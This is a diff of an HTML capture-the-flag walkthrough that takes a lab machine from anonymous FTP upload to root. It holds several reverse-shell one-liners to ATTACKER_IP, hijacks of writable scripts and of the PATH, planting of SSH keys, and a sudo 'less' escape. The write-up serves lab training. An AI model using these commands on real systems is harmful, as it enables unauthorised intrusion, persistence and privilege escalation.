@@ -14,49 +14,93 @@
     </header>
 
     <main>
+        <h3>Question1</h3>
         <p> <code>nmap -sS TARGET_IP</code> yields port 21(ftp), 22(ssh). </p> 
-        <p> <code>ftp TARGET_IP</code> and logging in as <code>anonymous</code>, we can upload any file to <code>/incoming</code>. </p>
-        <p> So we upload <code> bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1</code> to it. </p>
-        <p> Then we get the reverse shell as <code>recon_user</code> using <code>nc -lvnp 4444</code>. </p>
-        <p> We create an private, public ssh key pair with <code>ssh-keygen -f recon_rsa -C THM </code>.</p>
-        <p> We then create the file <code>/home/recon_user/.ssh/authorized_keys</code> and populate it with the content of <code>recon_rsa.pub</code>. </p>
+        <img src="nmap.png" width="800px" height="auto">
+        <p> 
+            Doing <code>ftp TARGET_IP</code> and logging in as <code>anonymous</code>, we can see that we can upload any file to <code>/incoming</code>. 
+            So we upload <code>shell.sh</code> containing <code> bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1</code> to it. One thing of note here is that
+            the server has a filter which doesn't allow slashes in the path of the file to upload, meaning that something like 
+            <code>put /home/user/shell.sh</code> doesn't work.
+        </p>
+        <img src="ftp.png" width="800px" height="auto">
+        <p> Then we get the reverse shell as <code>recon_user</code> using <code>nc -lvnp 4444</code> on the attacker machine. </p>
+
+        <h3>Question2</h3>
+        <img src="rev_shell_recon.png" width="800px" height="auto">
+        <p> 
+            To get <code>pspy64</code> into the server, we have to gain ssh access to the server.
+            We generate a private, public ssh key pair with <code>ssh-keygen -f recon_rsa -C THM </code> on the attacker machine.
+            And then create the file <code>/home/recon_user/.ssh/authorized_keys</code> in the target and populate it with the content of 
+            <code>recon_rsa.pub</code>. 
+        </p>
+        <img src="create_authorized_keys.png" width="800px" height="auto">
         <p> Now we can ssh into the server as <code>recon_user</code> via <code>ssh -i recon_rsa recon_user@TARGET_IP</code>. </p>
-        <p> We do <code>scp -i recon_rsa pspy64 recon_user@TARGET_IP:/tmp</code> to send <code>pspy64</code> to the target server.</p>
+        <img src="ssh_login.png" width="800px" height="auto">
+        <p> 
+            We do <code>scp -i recon_rsa pspy64 recon_user@TARGET_IP:/tmp</code> to send <code>pspy64</code> to the target server.
+            I've tried uploading <code>pspy64</code> via ftp, but that caused the <code>ftp</code> user to own the executable, making it impossible for
+            other users to execute it.
+        </p>
+        <img src="scp_pspy64.png" width="800px" height="auto">
         <p> And then we change its permissions so everybody can use it with <code>chmod 777 /tmp/pspy64</code>. </p>
         <p> 
-            Using <code>pspy64</code>, we obtain that <code>/opt/dev/backup.sh</code> is being called as <code>dev_user</code> but is writable by 
-            <code>recon_user</code>. So we append <code>bash -i >& /dev/tcp/ATTACKER_IP/5555 0>&1</code> to it and obtain a reverse shell using
-            <code>nc -lvnp 5555</code>. 
+            Using <code>pspy64</code>, we notice that <code>/opt/dev/backup.sh</code> is being called as <code>dev_user</code> but is writable by 
+            <code>recon_user</code>. So we append <code>bash -i >& /dev/tcp/ATTACKER_IP/5555 0>&1</code> to it and obtain a reverse shell 
+            as <code>dev_user</code> using <code>nc -lvnp 5555</code>.
         </p>
+        <img src="pspy_backup.sh.png" width="800px" height="auto">
+
+        <h3>Question3</h3>
         <p>
-            Checking the results of <code>pspy64</code>, we know that <code>healthcheck.service</code> keeps getting run with UID=1003.
+            Checking the results of <code>pspy64</code>, we realize that <code>healthcheck.service</code> keeps getting run with UID=1003.
             So if we check its config file at <code>/etc/systemd/system/healthcheck.service</code>, we can see that it is executing 
             <code>/usr/local/bin/healthcheck</code> and the PATH variable has <code>/opt/dev/bin</code> prepended to it,
             meaning that the <code>ps</code> being called at <code>/usr/local/bin/healthcheck</code> is actually <code>/opt/dev/bin/ps</code>.
         </p>
+        <img src="healthcheckservice.png" width="800px" height="auto">
         <p>
-            So we can change <code>/opt/dev/bin/ps</code> to have <code>bash -i >& /dev/tcp/ATTACKER_IP/6666 0>&1</code> and get the reverse_shell
+            So we can change <code>/opt/dev/bin/ps</code> to have <code>bash -i >& /dev/tcp/ATTACKER_IP/6666 0>&1</code> and get the reverse shell
             of <code>monitor_user</code>.
         </p>
+        <img src="edit_ps.png" width="800px" height="auto">
+
+        <h4>Question4</h4>
         <p>
             Running <code>sudo -l</code> as <code>monitor_user</code> reveals that they can execute <code>/usr/local/bin/deploy.sh</code> as
             <code>ops_user</code>.
         </p>
+        <img src="monitor_sudo_l.png" width="800px" height="auto">
         <p>
             And checking <code>deploy_helper.sh</code> mentioned in <code>deploy.sh</code>, we can see that <code>monitor_user</code> has write access
-            to it.
+            to it. So we append <code>bash -i >& /dev/tcp/ATTACKER_IP/7777 0>&1</code> to it and run 
+            <code>sudo -u ops_user /usr/local/bin/deploy.sh</code>, catching the reverse shell with <code>nc -lvnp 7777</code> on the attacker machine.
         </p>
+        <img src="edit_deploy_helper.sh.png" width="800px" height="auto">
+
+        <h5>Question5</h5>
         <p>
-            So we append <code>bash -i >& /dev/tcp/ATTACKER_IP/7777 0>&1</code> to it and run <code>sudo -u ops_user /usr/local/bin/deploy.sh</code>,
-            catching the reverse shell with <code>nc -lvnp 7777</code> from the attacker machine.
+            Doing <code>sudo -l</code> as <code>ops_user</code> reveals that it can run <code>less</code> as <code>root</code>. 
         </p>
+        <img src="ops_sudo_l.png" width="800px" height="auto">
         <p>
-            Doing <code>sudo -l</code> as <code>ops_user</code> reveals that it can run <code>less</code> as <code>root</code>. This means that
-            if we can execute shell commands in the prompt of <code>less</code>, we can execute <code>/bin/bash</code> and get <code>root</code>'s shell.
-            Unfortunately, we cant get access to the prompt in a simple reverse shell. So we have to create file <code>/home/ops_user/.ssh/authorized_keys</code>
-            and populate it with the content of <code>recon_rsa.pub</code>, just like we did for <code>recon_user</code>. This allows us to ssh into the server
-            as <code>ops_user</code> via <code>ssh -i recon_rsa ops_user@TARGET_IP</code> and do <code>sudo less flag.txt</code> which gives us access to
-            <code>less</code>'s command prompt. There we can type <code>!/bin/bash</code> to get the shell of <code>root</code> to read the flag. 
+            This means that if we can execute shell commands in the prompt of <code>less</code>, we can execute <code>/bin/bash</code> and get the root shell.
+            Unfortunately, we can't get access to the prompt in a simple reverse shell, as it behaves more like <code>cat</code> in this limited environment. 
+            So we have to get ssh access as <code>ops_user</code>.
+            We create the file <code>/home/ops_user/.ssh/authorized_keys</code> and populate it with the content of <code>recon_rsa.pub</code>, 
+            just like we did for <code>recon_user</code>. This allows us to ssh into the server as <code>ops_user</code> via 
+            <code>ssh -i recon_rsa ops_user@TARGET_IP</code> and do <code>sudo less ANY_FILE</code> which gives us access to
+            <code>less</code>'s command prompt. There we can type <code>!/bin/bash</code> to get the root shell to read the flag. 
+        </p>
+        <img src="binbash.png" width="800px" height="auto">
+        <p>
+            Here is what happens after we get the root shell.
+        </p>
+        <img src="rootwhoami.png" width="400px" height="auto">
+        <p>
+            Another method of solving question 5 is by abusing the fact that every user's flag thus far has been called <code>flag.txt</code> 
+            and has been located in its owner's home directory. From this we can assume that the path to <code>root</code>'s flag is
+            <code>/root/flag.txt</code> and type <code>sudo less /root/flag.txt</code> to get the flag without fully escalating user privilege.
         </p>
     </main>
 </body>
